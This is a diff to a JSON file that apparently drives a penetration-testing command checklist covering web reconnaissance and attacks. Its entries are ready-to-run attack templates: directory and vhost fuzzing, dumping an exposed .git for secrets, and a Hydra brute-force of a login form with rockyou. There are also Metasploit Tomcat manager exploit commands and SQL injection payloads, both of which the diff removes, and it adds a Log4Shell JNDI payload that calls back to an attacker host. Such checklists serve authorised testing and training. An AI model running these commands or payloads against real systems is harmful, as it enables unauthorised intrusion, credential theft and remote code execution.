@@ -43,32 +43,11 @@
           "commands": [
             "gobuster dir -u http://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x .php,.html,.txt"
           ]
-        }
-      ]
-    },
-    {
-      "category": "3. VHost & Visual Recon",
-      "tasks": [
-        {
-          "id": "http_ffuf_vhost",
-          "title": "Ffuf (VHost Fuzzing)",
-          "description": "Fuzz the Host header to find hidden virtual hosts. Replace the -fs flag value with the default response size.",
-          "commands": [
-            "ffuf -u http://{target_ip} -H \"Host: FUZZ.target.local\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131"
-          ]
-        },
-        {
-          "id": "http_eyewitness",
-          "title": "EyeWitness (Visual Recon)",
-          "description": "Take screenshots of discovered web pages, identify default credentials, and categorize them into an HTML report.",
-          "commands": [
-            "eyewitness -f urllist.txt -d /tmp/eyewitness_results --web"
-          ]
         },
         {
           "id": "http_gowitness",
           "title": "Gowitness (Visual Recon)",
-          "description": "Take full-page screenshots of a large list of discovered URLs and view them in a local web interface.",
+          "description": "If you have a large list of discovered URLs, use gowitness to screenshot all of them and view them in a local web interface.",
           "commands": [
             "gowitness scan file -f urllist.txt --screenshot-fullpage --timeout 15 --write-db",
             "gowitness report server"
@@ -77,22 +56,35 @@
       ]
     },
     {
-      "category": "4. Web Application Attacks",
+      "category": "3. VHost & Subdomain Fuzzing",
       "tasks": [
         {
-          "id": "http_sqli_basic",
-          "title": "Basic SQLi Probing",
-          "description": "Test input fields and URL parameters for simple SQL injection vulnerabilities.",
+          "id": "http_ffuf_vhost",
+          "title": "Ffuf (VHost Fuzzing)",
+          "description": "Fuzz the Host header to find hidden virtual hosts. Be sure to replace the -fs (filter size) flag value with the default response size.",
           "commands": [
-            "admin' OR 1=1 -- //",
-            "test' OR 'a'='a"
+            "ffuf -u http://{target_ip} -H \"Host: FUZZ.target.local\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131"
           ]
         },
+        {
+          "id": "http_gobuster_vhost",
+          "title": "Gobuster (VHost)",
+          "description": "Alternative VHost enumeration tool.",
+          "commands": [
+            "gobuster vhost -u http://{target_ip} -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "4. Web Application Attacks",
+      "tasks": [
         {
           "id": "http_git_dumper",
           "title": "Exposed .git Extraction",
           "description": "If /.git is accessible, dump the repository locally and scan it for hardcoded secrets.",
           "commands": [
+            "python3 -m venv git-env && source git-env/bin/activate && pip install git-dumper",
             "git-dumper http://{target_ip}/.git ./git-repo",
             "cd git-repo && git log -S'http'",
             "cd git-repo && gitleaks detect"
@@ -101,18 +93,17 @@
         {
           "id": "http_hydra_form",
           "title": "Hydra Form Brute-Forcing",
-          "description": "Brute-force an HTTP POST login form. Adjust the URI path, variables, and failure string.",
+          "description": "Brute-force an HTTP POST login form. Adjust the URI path, username/password variables, and failure message string.",
           "commands": [
             "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form \"/login.php:username=^USER^&password=^PASS^:Data error\""
           ]
         },
         {
-          "id": "http_tomcat_jboss",
-          "title": "Tomcat / JBoss Enumeration",
-          "description": "Scan and exploit default credentials on Tomcat or JBoss managers.",
+          "id": "http_log4shell",
+          "title": "Log4Shell Probing",
+          "description": "Test input fields or headers for Log4j vulnerability.",
           "commands": [
-            "msfconsole -x \"use auxiliary/scanner/http/tomcat_enum; set RHOSTS {target_ip}; run\"",
-            "msfconsole -x \"use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target_ip}; run\""
+            "${jndi:ldap://<Kali_IP>:<Port>/o=reference}"
           ]
         }
       ]
